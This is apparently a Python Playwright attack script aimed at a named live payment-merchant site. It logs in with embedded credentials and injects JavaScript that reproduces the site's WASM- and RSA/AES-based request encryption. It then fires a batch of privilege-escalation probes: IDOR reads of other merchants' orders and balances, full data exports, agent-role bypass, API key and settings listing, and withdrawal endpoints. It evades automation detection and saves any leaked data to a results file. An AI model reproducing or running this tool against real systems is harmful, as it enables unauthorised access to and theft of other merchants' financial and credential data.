import asyncio, json, os, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

from playwright.async_api import async_playwright

CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
TARGET = "https://merchant.lamuzhifu.top"
OUT = r"E:\IOSusdt"
PROXY = "http://127.0.0.1:10809"
LOGIN, PASSWD = "\u51a0\u519b", "<REDACTED_PASSWORD>"

# Install a faithful re-implementation of the app's crypto pipeline using the
# page's own WASM box (window.__cx = {m, q, b, w}) plus WebCrypto.
PIPE = r"""
window.__PIPE = {};
(function () {
  window.__PLAIN = [];
  const oParse = JSON.parse;
  window.JSON.parse = function (t, r) {
    const v = oParse.call(this, t, r);
    try {
      if (v && typeof v === 'object' && !Array.isArray(v) && !(v.v === 3 && v.p && v.q))
        window.__PLAIN.push({ at: Date.now(), data: v });
    } catch (e) {}
    return v;
  };

  const _o = (m) => (m ^ 90) & 15;
  const b64 = (u8) => btoa(String.fromCharCode.apply(null, new Uint8Array(u8)));
  const unb64 = (s) => Uint8Array.from(atob(s), c => c.charCodeAt(0));

  const PKEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAosH1IaLhk58ii8kZlQXIet7mn1SzDsJdiGIcGrPjxqojWI2cEyxtnJolmXyN5YIoEAYnNe3+ecHVq47ymvNkTXamELcV1jeyELsQprVxtSpIxylfg9Qu2oe3qqp7kD18wucVzETbKfP0El6FlRWSPmfCicqykDBIm04pPcwCO7yTueo/NeafIlB3Vm8hh2IyKwdjF+84U3tZu80So0cRAvigIGW0KVB/l4O0/rb8XLfG+iQ7wrXbwNj//kKnlhRTMP0CxgD+O174mSjMzF9q8i7+JomkW+Dotio+NsJVjPGzB3Tn0+rtnctOH4wff6FFLpTFezeYgAap6OvHhAe5JQIDAQAB";

  function rsaKey() {
    const der = unb64(PKEY);
    return crypto.subtle.importKey('spki', der, { name: 'RSA-OAEP', hash: 'SHA-1' }, false, ['encrypt']);
  }

  // Build {v:3,k,p,q,t} exactly as azhifuRsaEncryptPost does.
  window.__PIPE.encrypt = async function (obj, sid) {
    await (window.cxReady || Promise.resolve());
    const B = window.__cx.b, m = window.__cx.m, q = window.__cx.q;
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const rnd = crypto.getRandomValues(new Uint8Array(8));
    const plain = new TextEncoder().encode(typeof obj === 'string' ? obj : JSON.stringify(obj));
    const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
    const raw = new Uint8Array(await crypto.subtle.exportKey('raw', key));
    const pub = await rsaKey();
    const ct = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, plain));
    const wp = new Uint8Array(await crypto.subtle.encrypt({ name: 'RSA-OAEP' }, pub, raw));

    q(_o(89), window.outerWidth | 0, window.innerWidth | 0,
              window.outerHeight | 0, window.innerHeight | 0,
              /Firefox|FxiOS/.test(navigator.userAgent) ? 1 : 0);
    m.set(raw, B + 0);
    m.set(wp, B + 64);
    m.set(iv, B + 400);
    m.set(rnd, B + 416);
    m.set(ct, B + 1024);
    const n = q(_o(91), ct.length, wp.length, 0, 0);
    let s = '';
    for (let i = 0; i < n; i++) s += String.fromCharCode(m[B + 31522816 + i]);
    return { key: key, raw: raw, body: JSON.parse(s) };
  };

  window.__PIPE.decrypt = async function (buf, key, raw) {
    const B = window.__cx.b, m = window.__cx.m, q = window.__cx.q;
    const enc = String(buf.p || '') + String(buf.q || '');
    q(_o(89), window.outerWidth | 0, window.innerWidth | 0,
              window.outerHeight | 0, window.innerHeight | 0,
              /Firefox|FxiOS/.test(navigator.userAgent) ? 1 : 0);
    m.set(raw, B + 0);
    for (let i = 0; i < enc.length; i++) m[B + 10551296 + i] = enc.charCodeAt(i) & 255;
    const cl = q(_o(88), enc.length, 0, 0, 0);
    const out = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: m.slice(B + 400, B + 412) },
                                            key, m.slice(B + 1024, B + 1024 + cl));
    const t = new TextDecoder().decode(new Uint8Array(out));
    try { return JSON.parse(t); } catch (e) { return t; }
  };

  // GET with X-Ch / X-Ck gate headers, auto-decrypt
  window.__PIPE.get = async function (path, token) {
    const e = { headers: {}, method: 'get' };
    const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
    const raw = new Uint8Array(await crypto.subtle.exportKey('raw', key));
    const pub = await rsaKey();
    const wrapped = await crypto.subtle.encrypt({ name: 'RSA-OAEP' }, pub, raw);
    const B = window.__cx.b, m = window.__cx.m, q = window.__cx.q;
    const u = new Uint8Array(wrapped);
    q(_o(89), window.outerWidth | 0, window.innerWidth | 0,
              window.outerHeight | 0, window.innerHeight | 0,
              /Firefox|FxiOS/.test(navigator.userAgent) ? 1 : 0);
    m.set(u, B + 64);
    const n2 = q(_o(95), u.length, 0, 0, 0);
    let ck = '';
    for (let i = 0; i < n2; i++) ck += String.fromCharCode(m[B + 31522816 + i]);

    const h = { 'Accept': 'application/json, text/plain, */*', 'X-Ch': '1', 'X-Ck': ck };
    if (token) h['Authorization'] = token;
    const r = await fetch(path, { method: 'GET', headers: h });
    const txt = await r.text();
    let j = null;
    try { j = JSON.parse(txt); } catch (e2) {}
    if (j && j.v === 3 && j.p) {
      try { return { status: r.status, data: await window.__PIPE.decrypt(j, key, raw) }; }
      catch (e3) { return { status: r.status, err: 'decrypt:' + e3, raw: txt.slice(0, 200) }; }
    }
    return { status: r.status, data: j || txt.slice(0, 300) };
  };

  // POST with full envelope + X-Ws
  window.__PIPE.post = async function (path, body, token, sid) {
    const enc = await window.__PIPE.encrypt(body, sid);
    const h = { 'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'X-Ch': '1', 'X-Ws': sid || sessionStorage.getItem('_wrid') };
    if (token) h['Authorization'] = token;
    const r = await fetch(path, { method: 'POST', headers: h, body: JSON.stringify(enc.body) });
    const txt = await r.text();
    let j = null;
    try { j = JSON.parse(txt); } catch (e2) {}
    if (j && j.v === 3 && j.p) {
      try { return { status: r.status, data: await window.__PIPE.decrypt(j, enc.key, enc.raw) }; }
      catch (e3) { return { status: r.status, err: 'decrypt:' + e3, raw: txt.slice(0, 200) }; }
    }
    return { status: r.status, data: j || txt.slice(0, 300) };
  };
})();
"""


async def do_login(pg):
    await pg.goto(TARGET + "/login", wait_until="commit", timeout=60000)
    for i in range(40):
        await pg.wait_for_timeout(1000)
        try:
            d = await pg.evaluate("""() => ({ w: window.__cx?window.__cx.w:null,
                cxp: window.__cxp||null, n: document.querySelectorAll('input').length })""")
        except Exception:
            continue
        if d and d["w"] == 1 and d["cxp"] == 1 and d["n"] >= 3:
            break
    await pg.wait_for_timeout(2000)
    await pg.evaluate("""async (c) => {
        const set=(el,v)=>{const d=Object.getOwnPropertyDescriptor(el.__proto__,'value');
          d&&d.set?d.set.call(el,v):(el.value=v);
          el.dispatchEvent(new Event('input',{bubbles:true}));
          el.dispatchEvent(new Event('change',{bubbles:true}));};
        const ins=Array.from(document.querySelectorAll('input'));
        const u=ins.find(i=>i.name==='username'||i.type==='text');
        const pw=ins.find(i=>i.name==='password'||i.type==='password');
        const tt=ins.find(i=>i.name==='Totp');
        if(u)set(u,c.u); if(pw)set(pw,c.p); if(tt)set(tt,'');
        await new Promise(r=>setTimeout(r,700));
        const bs=Array.from(document.querySelectorAll('button'));
        const btn=bs.find(x=>/\\u767b\\u5f55/.test(x.innerText))||bs[0];
        if(btn)btn.click(); }""", {"u": LOGIN, "p": PASSWD})
    for i in range(45):
        await pg.wait_for_timeout(1000)
        t = await pg.evaluate("() => localStorage.getItem('merchant-token')||''")
        if t:
            print(f"[+] login ok ~{i+1}s")
            return t
    return ""


PAGER = lambda cond=None: {"Pager": {"PageIndex": 1, "PageSize": 50}, "Condition": cond or {}}

TESTS = [
    # ---- IDOR: read other merchants' orders / flows ----
    ("POST", "/api/MerchantOrder/List", PAGER({"MerchantId": 1}), "IDOR 订单 MerchantId=1"),
    ("POST", "/api/MerchantOrder/List", PAGER({"MerchantId": 1370}), "IDOR 订单 MerchantId=1370"),
    ("POST", "/api/MerchantOrder/List", PAGER({"MerchantLoginName": "admin"}), "IDOR 订单 admin"),
    ("POST", "/api/MerchantOrder/List", PAGER({"PayDirection": 2}), "代付订单 PayDirection=2"),
    ("POST", "/api/MerchantOrder/List", PAGER({}), "代收订单 默认"),
    ("POST", "/api/Transaction/List", PAGER({"MerchantId": 1}), "IDOR 流水 MerchantId=1"),
    ("POST", "/api/BalanceRecord/List", PAGER({"MerchantId": 1}), "IDOR 余额记录 MerchantId=1"),
    ("POST", "/api/BalanceRecord/List", PAGER({"Condition": {"MerchantId": 1}}), "余额记录 嵌套 Condition"),
    ("POST", "/api/Transaction/List", PAGER({"MerchantNo": "<REDACTED_ACCESSKEY>"}), "已知 APIKey 查流水"),
    ("POST", "/api/MerchantOrder/List", PAGER({"MerchantOrderNo": ""}), "订单空条件"),
    # ---- Export: bypass paging to dump everything ----
    ("POST", "/api/MerchantOrder/Export", {"Condition": {}}, "导出 全部订单"),
    ("POST", "/api/Transaction/Export", {"Condition": {}}, "导出 全部流水"),
    ("POST", "/api/Commission/export", {"Condition": {}}, "导出 佣金"),
    # ---- Agent endpoints: role bypass ----
    ("GET", "/api/Agent/Subordinates", None, "代理下级商户"),
    ("POST", "/api/Agent/Subordinates", PAGER(), "代理下级商户 POST"),
    ("GET", "/api/Home/AgentDashboard", None, "代理仪表盘"),
    ("POST", "/api/AgentDailyReport/List", PAGER(), "代理日报"),
    ("POST", "/api/AgentReviewMerchantOrderList/List", PAGER(), "代理审单"),
    # ---- Commission / settlement ----
    ("POST", "/api/Commission/List", PAGER(), "佣金列表"),
    ("POST", "/api/CommissionSettlement/List", PAGER(), "佣金结算"),
    ("GET", "/api/CommissionSettlement/Balance", None, "佣金余额"),
    ("POST", "/api/CommissionSettlement/List", PAGER({"MerchantId": 1}), "佣金结算 MerchantId=1"),
    # ---- Config / credentials ----
    ("GET", "/api/ApiKey/List", None, "API密钥列表"),
    ("GET", "/api/AuthorizedIp/List", None, "IP白名单"),
    ("GET", "/api/System/Settings", None, "系统设置"),
    ("GET", "/api/Permission/Query", None, "权限查询"),
    ("GET", "/api/MerchantChannel/List", None, "商户通道"),
    ("POST", "/api/MerchantDailyReport/List", PAGER(), "商户日报"),
    # ---- Withdrawal ----
    ("POST", "/api/WebOrder/ApplyWithdrawalOrders", PAGER(), "提现订单"),
    ("GET", "/api/WebOrder/GetWithdrawalExcelTemplate", None, "提现模板"),
]


async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(
            headless=False, executable_path=CHROME, proxy={"server": PROXY},
            args=["--ignore-certificate-errors", "--no-sandbox",
                  "--disable-blink-features=AutomationControlled", "--window-size=1920,1080"])
        ctx = await b.new_context(ignore_https_errors=True,
                                  viewport={"width": 1920, "height": 1080},
                                  screen={"width": 1920, "height": 1080})
        pg = await ctx.new_page()
        tok = await do_login(pg)
        if not tok:
            print("[!] login failed"); await b.close(); return
        await pg.wait_for_timeout(3000)
        await pg.add_script_tag(content=PIPE)

        # sanity check the pipeline first
        chk = await pg.evaluate("""async (t) => {
            try { return await window.__PIPE.get('/api/Account/Self', t); }
            catch (e) { return { err: String(e) }; } }""", tok)
        print("[sanity GET /api/Account/Self]", json.dumps(chk, ensure_ascii=False)[:300])
        if chk.get("err"):
            print("[!] pipeline broken, aborting"); await b.close(); return

        results = []
        print("\n" + "=" * 100)
        print(f"{'METHOD':5s} {'ENDPOINT':44s} {'ST':>4s} {'TAG':26s} RESULT")
        print("=" * 100)
        for method, path, body, tag in TESTS:
            if method == "GET":
                r = await pg.evaluate("""async (a) => {
                    try { return await window.__PIPE.get(a.p, a.t); }
                    catch (e) { return { err: String(e) }; } }""",
                                      {"p": path, "t": tok})
            else:
                r = await pg.evaluate("""async (a) => {
                    try { return await window.__PIPE.post(a.p, a.b, a.t); }
                    catch (e) { return { err: String(e) }; } }""",
                                      {"p": path, "b": body, "t": tok})
            st = r.get("status")
            d = r.get("data")
            s_ = json.dumps(d, ensure_ascii=False) if d is not None else str(r.get("err") or r)
            results.append({"method": method, "path": path, "tag": tag,
                            "status": st, "resp": s_[:2000]})
            print(f"{method:5s} {path:44s} {str(st):>4} {tag:26s} {s_[:120]}")

        json.dump(results, open(os.path.join(OUT, "privesc_results.json"), "w",
                                encoding="utf-8"), ensure_ascii=False, indent=1)
        print("\n[+] privesc_results.json saved")

        # highlighted findings
        print("\n" + "=" * 100)
        print("HITS — endpoints returning non-empty business data")
        print("=" * 100)
        for r in results:
            if r["status"] == 200 and len(r["resp"]) > 120 and "TotalCount\": 0" not in r["resp"]:
                print(f"\n--- {r['method']} {r['path']}  [{r['tag']}]")
                print("    " + r["resp"][:600])
        await b.close()


asyncio.run(main())
